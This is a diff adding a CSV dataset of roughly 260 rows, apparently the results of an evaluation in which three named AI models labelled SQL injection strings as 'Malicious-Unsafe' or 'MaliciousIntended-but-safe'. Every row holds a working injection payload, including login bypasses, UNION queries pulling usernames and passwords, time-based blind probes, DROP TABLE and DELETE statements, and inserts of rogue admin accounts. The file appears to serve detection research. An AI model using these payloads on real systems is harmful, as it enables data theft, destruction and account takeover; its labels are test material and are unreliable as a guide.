@@ -1,0 +1,262 @@
+﻿Payload,Label,Model
+' OR '1'='1,Malicious-Unsafe,ChatGPT 5.2 Thinking
+"' UNION SELECT username, password FROM users--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+'; WAITFOR DELAY '0:0:5'--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+"' AND 1=CONVERT(int,@@version)--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+' AND 1=1--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+'; DROP TABLE users--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR 1=1--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+0x27 OR 0x31=0x31--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+'; SELECT pg_sleep(5)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+"' AND 1=CONVERT(int,USER())--",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"' AND SUBSTRING(@@version,1,1)='5'--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR 'a'='a,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+' OR 1=1-- -,Malicious-Unsafe,ChatGPT 5.2 Thinking
+'//OR//1=1--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+' OR CAST('a' AS INT)=CAST('a' AS INT)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR SLEEP(5)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+"' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+'; SELECT pg_sleep(10)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR 1=1#,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR SLEEP(10)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+"' UNION SELECT NULL, NULL, username, password FROM users--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR 1=1/*,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+' AND (SELECT COUNT(*) FROM users) > 0--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR pg_sleep(7)--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"' UNION SELECT database(), NULL--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+'; WAITFOR DELAY '0:0:10'--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR CAST(1 AS INT)=1--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+"' OR SUBSTRING(user(),1,1)='r'--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"' UNION SELECT table_name, NULL FROM information_schema.tables--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR (SELECT sleep(5))--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR 0x61646d696e=0x61646d696e--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR SLEEP(5)#,Malicious-Unsafe,ChatGPT 5.2 Thinking
+"' UNION SELECT user(), NULL--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR pg_sleep(3)--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+'; WAITFOR DELAY '0:0:3'--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+"' OR SUBSTRING(@@version,1,1)='5'--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"'; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR SLEEP(8)/*,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"' OR SUBSTRING(user(),1,1)='a'/*",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+'; UPDATE users SET password='hacked' WHERE username='admin'--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR pg_sleep(6)/*,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR CAST('1' AS INT)=1--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+'; WAITFOR DELAY '0:0:7'/*,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"' OR SUBSTRING(@@version,1,1)='8'#",Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+'; DELETE FROM users WHERE username='guest'--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR 0x31=0x31--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR SLEEP(9)#,Malicious-Unsafe,ChatGPT 5.2 Thinking
+"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR pg_sleep(4)#,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+' OR CAST(1 AS INT)=1/*,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"' OR SUBSTRING(user(),1,1)='b'/*",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+'; WAITFOR DELAY '0:0:5'#,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"' OR SUBSTRING(@@version,1,1)='9'#",Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+'; DROP TABLE sessions--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR 0x41=0x41--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR SLEEP(11)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR pg_sleep(12)--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+'; UPDATE users SET password='newpass' WHERE username='admin'--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR SLEEP(12)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+"' OR SUBSTRING(user(),1,1)='c'--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+"'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR pg_sleep(8)--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"' UNION SELECT @@version, NULL--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+'; WAITFOR DELAY '0:0:8'--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+"' OR SUBSTRING(@@version,1,1)='7'--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+'; DELETE FROM users WHERE username='admin'--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR 0x42=0x42--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR SLEEP(13)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR pg_sleep(14)--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+"' OR SUBSTRING(user(),1,1)='d'--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+"'; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+'; WAITFOR DELAY '0:0:9'--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+"' OR SUBSTRING(@@version,1,1)='6'--",Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+' OR 0x43=0x43--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR SLEEP(14)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR pg_sleep(15)--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
+'; UPDATE users SET password='securepass' WHERE username='admin'--,Malicious-Unsafe,ChatGPT 5.2 Thinking
+' OR '1'='1,Malicious-Unsafe,Gemini 3 (pro)
+"' UNION SELECT username, password FROM users--",Malicious-Unsafe,Gemini 3 (pro)
+'; WAITFOR DELAY '0:0:5'--,Malicious-Unsafe,Gemini 3 (pro)
+"' AND 1=CONVERT(int,@@version)--",Malicious-Unsafe,Gemini 3 (pro)
+' AND 1=1--,Malicious-Unsafe,Gemini 3 (pro)
+'; DROP TABLE users--,Malicious-Unsafe,Gemini 3 (pro)
+' OR 1=1--,Malicious-Unsafe,Gemini 3 (pro)
+0x27 OR 0x31=0x31--,Malicious-Unsafe,Gemini 3 (pro)
+'; SELECT pg_sleep(5)--,Malicious-Unsafe,Gemini 3 (pro)
+"' AND 1=CONVERT(int,USER())--",Malicious-Unsafe,Gemini 3 (pro)
+"' AND SUBSTRING(@@version,1,1)='5'--",Malicious-Unsafe,Gemini 3 (pro)
+' OR 'a'='a,Malicious-Unsafe,Gemini 3 (pro)
+' OR 1=1-- -,Malicious-Unsafe,Gemini 3 (pro)
+'//OR//1=1--,MaliciousIntended-but-safe,Gemini 3 (pro)
+' OR CAST('a' AS INT)=CAST('a' AS INT)--,Malicious-Unsafe,Gemini 3 (pro)
+' OR SLEEP(5)--,Malicious-Unsafe,Gemini 3 (pro)
+"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",Malicious-Unsafe,Gemini 3 (pro)
+"' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",Malicious-Unsafe,Gemini 3 (pro)
+'; SELECT pg_sleep(10)--,Malicious-Unsafe,Gemini 3 (pro)
+' OR 1=1#,Malicious-Unsafe,Gemini 3 (pro)
+' OR SLEEP(10)--,Malicious-Unsafe,Gemini 3 (pro)
+"' UNION SELECT NULL, NULL, username, password FROM users--",Malicious-Unsafe,Gemini 3 (pro)
+' OR 1=1/*,MaliciousIntended-but-safe,Gemini 3 (pro)
+' AND (SELECT COUNT(*) FROM users) > 0--,Malicious-Unsafe,Gemini 3 (pro)
+' OR pg_sleep(7)--,Malicious-Unsafe,Gemini 3 (pro)
+"' UNION SELECT database(), NULL--",Malicious-Unsafe,Gemini 3 (pro)
+'; WAITFOR DELAY '0:0:10'--,Malicious-Unsafe,Gemini 3 (pro)
+' OR CAST(1 AS INT)=1--,Malicious-Unsafe,Gemini 3 (pro)
+"' OR SUBSTRING(user(),1,1)='r'--",Malicious-Unsafe,Gemini 3 (pro)
+' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--,Malicious-Unsafe,Gemini 3 (pro)
+"' UNION SELECT table_name, NULL FROM information_schema.tables--",Malicious-Unsafe,Gemini 3 (pro)
+' OR (SELECT sleep(5))--,Malicious-Unsafe,Gemini 3 (pro)
+' OR 0x61646d696e=0x61646d696e--,Malicious-Unsafe,Gemini 3 (pro)
+' OR SLEEP(5)#,Malicious-Unsafe,Gemini 3 (pro)
+"' UNION SELECT user(), NULL--",Malicious-Unsafe,Gemini 3 (pro)
+' OR pg_sleep(3)--,Malicious-Unsafe,Gemini 3 (pro)
+'; WAITFOR DELAY '0:0:3'--,Malicious-Unsafe,Gemini 3 (pro)
+"' OR SUBSTRING(@@version,1,1)='5'--",Malicious-Unsafe,Gemini 3 (pro)
+' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--,Malicious-Unsafe,Gemini 3 (pro)
+"'; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--",Malicious-Unsafe,Gemini 3 (pro)
+' OR SLEEP(8)/*,MaliciousIntended-but-safe,Gemini 3 (pro)
+"' OR SUBSTRING(user(),1,1)='a'/*",MaliciousIntended-but-safe,Gemini 3 (pro)
+'; UPDATE users SET password='hacked' WHERE username='admin'--,Malicious-Unsafe,Gemini 3 (pro)
+' OR pg_sleep(6)/*,MaliciousIntended-but-safe,Gemini 3 (pro)
+"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",Malicious-Unsafe,Gemini 3 (pro)
+' OR CAST('1' AS INT)=1--,Malicious-Unsafe,Gemini 3 (pro)
+'; WAITFOR DELAY '0:0:7'/*,MaliciousIntended-but-safe,Gemini 3 (pro)
+"' OR SUBSTRING(@@version,1,1)='8'#",Malicious-Unsafe,Gemini 3 (pro)
+' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/,MaliciousIntended-but-safe,Gemini 3 (pro)
+'; DELETE FROM users WHERE username='guest'--,Malicious-Unsafe,Gemini 3 (pro)
+' OR 0x31=0x31--,Malicious-Unsafe,Gemini 3 (pro)
+' OR SLEEP(9)#,Malicious-Unsafe,Gemini 3 (pro)
+"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",Malicious-Unsafe,Gemini 3 (pro)
+' OR pg_sleep(4)#,MaliciousIntended-but-safe,Gemini 3 (pro)
+' OR CAST(1 AS INT)=1/*,MaliciousIntended-but-safe,Gemini 3 (pro)
+"' OR SUBSTRING(user(),1,1)='b'/*",MaliciousIntended-but-safe,Gemini 3 (pro)
+"'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--",Malicious-Unsafe,Gemini 3 (pro)
+'; WAITFOR DELAY '0:0:5'#,MaliciousIntended-but-safe,Gemini 3 (pro)
+"' OR SUBSTRING(@@version,1,1)='9'#",Malicious-Unsafe,Gemini 3 (pro)
+' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#,MaliciousIntended-but-safe,Gemini 3 (pro)
+'; DROP TABLE sessions--,Malicious-Unsafe,Gemini 3 (pro)
+' OR 0x41=0x41--,Malicious-Unsafe,Gemini 3 (pro)
+' OR SLEEP(11)--,Malicious-Unsafe,Gemini 3 (pro)
+' OR pg_sleep(12)--,Malicious-Unsafe,Gemini 3 (pro)
+'; UPDATE users SET password='newpass' WHERE username='admin'--,Malicious-Unsafe,Gemini 3 (pro)
+' OR SLEEP(12)--,Malicious-Unsafe,Gemini 3 (pro)
+"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--",Malicious-Unsafe,Gemini 3 (pro)
+"' OR SUBSTRING(user(),1,1)='c'--",Malicious-Unsafe,Gemini 3 (pro)
+"'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--",Malicious-Unsafe,Gemini 3 (pro)
+' OR pg_sleep(8)--,Malicious-Unsafe,Gemini 3 (pro)
+"' UNION SELECT @@version, NULL--",Malicious-Unsafe,Gemini 3 (pro)
+'; WAITFOR DELAY '0:0:8'--,Malicious-Unsafe,Gemini 3 (pro)
+"' OR SUBSTRING(@@version,1,1)='7'--",Malicious-Unsafe,Gemini 3 (pro)
+' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--,Malicious-Unsafe,Gemini 3 (pro)
+'; DELETE FROM users WHERE username='admin'--,Malicious-Unsafe,Gemini 3 (pro)
+' OR 0x42=0x42--,Malicious-Unsafe,Gemini 3 (pro)
+' OR SLEEP(13)--,Malicious-Unsafe,Gemini 3 (pro)
+' OR pg_sleep(14)--,Malicious-Unsafe,Gemini 3 (pro)
+"' OR SUBSTRING(user(),1,1)='d'--",Malicious-Unsafe,Gemini 3 (pro)
+"'; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--",Malicious-Unsafe,Gemini 3 (pro)
+'; WAITFOR DELAY '0:0:9'--,Malicious-Unsafe,Gemini 3 (pro)
+"' OR SUBSTRING(@@version,1,1)='6'--",Malicious-Unsafe,Gemini 3 (pro)
+' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--,Malicious-Unsafe,Gemini 3 (pro)
+' OR 0x43=0x43--,Malicious-Unsafe,Gemini 3 (pro)
+' OR SLEEP(14)--,Malicious-Unsafe,Gemini 3 (pro)
+' OR pg_sleep(15)--,Malicious-Unsafe,Gemini 3 (pro)
+'; UPDATE users SET password='securepass' WHERE username='admin'--,Malicious-Unsafe,Gemini 3 (pro)
+' OR '1'='1,Malicious-Unsafe,Claude Sonnet 4.5
+"' UNION SELECT username, password FROM users--",Malicious-Unsafe,Claude Sonnet 4.5
+'; WAITFOR DELAY '0:0:5'--,Malicious-Unsafe,Claude Sonnet 4.5
+"' AND 1=CONVERT(int,@@version)--",Malicious-Unsafe,Claude Sonnet 4.5
+' AND 1=1--,Malicious-Unsafe,Claude Sonnet 4.5
+'; DROP TABLE users--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR 1=1--,Malicious-Unsafe,Claude Sonnet 4.5
+0x27 OR 0x31=0x31--,Malicious-Unsafe,Claude Sonnet 4.5
+'; SELECT pg_sleep(5)--,Malicious-Unsafe,Claude Sonnet 4.5
+"' AND 1=CONVERT(int,USER())--",Malicious-Unsafe,Claude Sonnet 4.5
+"' AND SUBSTRING(@@version,1,1)='5'--",Malicious-Unsafe,Claude Sonnet 4.5
+' OR 'a'='a,Malicious-Unsafe,Claude Sonnet 4.5
+' OR 1=1-- -,Malicious-Unsafe,Claude Sonnet 4.5
+'//OR//1=1--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR CAST('a' AS INT)=CAST('a' AS INT)--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR SLEEP(5)--,Malicious-Unsafe,Claude Sonnet 4.5
+"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",Malicious-Unsafe,Claude Sonnet 4.5
+"' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",Malicious-Unsafe,Claude Sonnet 4.5
+'; SELECT pg_sleep(10)--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR 1=1#,Malicious-Unsafe,Claude Sonnet 4.5
+' OR SLEEP(10)--,Malicious-Unsafe,Claude Sonnet 4.5
+"' UNION SELECT NULL, NULL, username, password FROM users--",Malicious-Unsafe,Claude Sonnet 4.5
+' OR 1=1/*,Malicious-Unsafe,Claude Sonnet 4.5
+' AND (SELECT COUNT(*) FROM users) > 0--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR pg_sleep(7)--,Malicious-Unsafe,Claude Sonnet 4.5
+"' UNION SELECT database(), NULL--",Malicious-Unsafe,Claude Sonnet 4.5
+'; WAITFOR DELAY '0:0:10'--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR CAST(1 AS INT)=1--,Malicious-Unsafe,Claude Sonnet 4.5
+"' OR SUBSTRING(user(),1,1)='r'--",Malicious-Unsafe,Claude Sonnet 4.5
+' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--,Malicious-Unsafe,Claude Sonnet 4.5
+"' UNION SELECT table_name, NULL FROM information_schema.tables--",Malicious-Unsafe,Claude Sonnet 4.5
+' OR (SELECT sleep(5))--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR 0x61646d696e=0x61646d696e--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR SLEEP(5)#,Malicious-Unsafe,Claude Sonnet 4.5
+"' UNION SELECT user(), NULL--",Malicious-Unsafe,Claude Sonnet 4.5
+' OR pg_sleep(3)--,Malicious-Unsafe,Claude Sonnet 4.5
+'; WAITFOR DELAY '0:0:3'--,Malicious-Unsafe,Claude Sonnet 4.5
+"' OR SUBSTRING(@@version,1,1)='5'--",Malicious-Unsafe,Claude Sonnet 4.5
+' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--,Malicious-Unsafe,Claude Sonnet 4.5
+"'; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--",Malicious-Unsafe,Claude Sonnet 4.5
+' OR SLEEP(8)/*,Malicious-Unsafe,Claude Sonnet 4.5
+"' OR SUBSTRING(user(),1,1)='a'/*",Malicious-Unsafe,Claude Sonnet 4.5
+'; UPDATE users SET password='hacked' WHERE username='admin'--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR pg_sleep(6)/*,Malicious-Unsafe,Claude Sonnet 4.5
+"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",Malicious-Unsafe,Claude Sonnet 4.5
+' OR CAST('1' AS INT)=1--,Malicious-Unsafe,Claude Sonnet 4.5
+'; WAITFOR DELAY '0:0:7'/*,Malicious-Unsafe,Claude Sonnet 4.5
+"' OR SUBSTRING(@@version,1,1)='8'#",Malicious-Unsafe,Claude Sonnet 4.5
+' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/,MaliciousIntended-but-safe,Claude Sonnet 4.5
+'; DELETE FROM users WHERE username='guest'--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR 0x31=0x31--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR SLEEP(9)#,Malicious-Unsafe,Claude Sonnet 4.5
+"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",Malicious-Unsafe,Claude Sonnet 4.5
+' OR pg_sleep(4)#,Malicious-Unsafe,Claude Sonnet 4.5
+' OR CAST(1 AS INT)=1/*,Malicious-Unsafe,Claude Sonnet 4.5
+"' OR SUBSTRING(user(),1,1)='b'/*",Malicious-Unsafe,Claude Sonnet 4.5
+"'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--",Malicious-Unsafe,Claude Sonnet 4.5
+'; WAITFOR DELAY '0:0:5'#,Malicious-Unsafe,Claude Sonnet 4.5
+"' OR SUBSTRING(@@version,1,1)='9'#",Malicious-Unsafe,Claude Sonnet 4.5
+' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#,Malicious-Unsafe,Claude Sonnet 4.5
+'; DROP TABLE sessions--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR 0x41=0x41--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR SLEEP(11)--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR pg_sleep(12)--,Malicious-Unsafe,Claude Sonnet 4.5
+'; UPDATE users SET password='newpass' WHERE username='admin'--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR SLEEP(12)--,Malicious-Unsafe,Claude Sonnet 4.5
+"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--",Malicious-Unsafe,Claude Sonnet 4.5
+"' OR SUBSTRING(user(),1,1)='c'--",Malicious-Unsafe,Claude Sonnet 4.5
+"'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--",Malicious-Unsafe,Claude Sonnet 4.5
+' OR pg_sleep(8)--,Malicious-Unsafe,Claude Sonnet 4.5
+"' UNION SELECT @@version, NULL--",Malicious-Unsafe,Claude Sonnet 4.5
+'; WAITFOR DELAY '0:0:8'--,Malicious-Unsafe,Claude Sonnet 4.5
+"' OR SUBSTRING(@@version,1,1)='7'--",Malicious-Unsafe,Claude Sonnet 4.5
+' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--,Malicious-Unsafe,Claude Sonnet 4.5
+'; DELETE FROM users WHERE username='admin'--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR 0x42=0x42--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR SLEEP(13)--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR pg_sleep(14)--,Malicious-Unsafe,Claude Sonnet 4.5
+"' OR SUBSTRING(user(),1,1)='d'--",Malicious-Unsafe,Claude Sonnet 4.5
+"'; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--",Malicious-Unsafe,Claude Sonnet 4.5
+'; WAITFOR DELAY '0:0:9'--,Malicious-Unsafe,Claude Sonnet 4.5
+"' OR SUBSTRING(@@version,1,1)='6'--",Malicious-Unsafe,Claude Sonnet 4.5
+' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR 0x43=0x43--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR SLEEP(14)--,Malicious-Unsafe,Claude Sonnet 4.5
+' OR pg_sleep(15)--,Malicious-Unsafe,Claude Sonnet 4.5
+'; UPDATE users SET password='securepass' WHERE username='admin'--,Malicious-Unsafe,Claude Sonnet 4.5
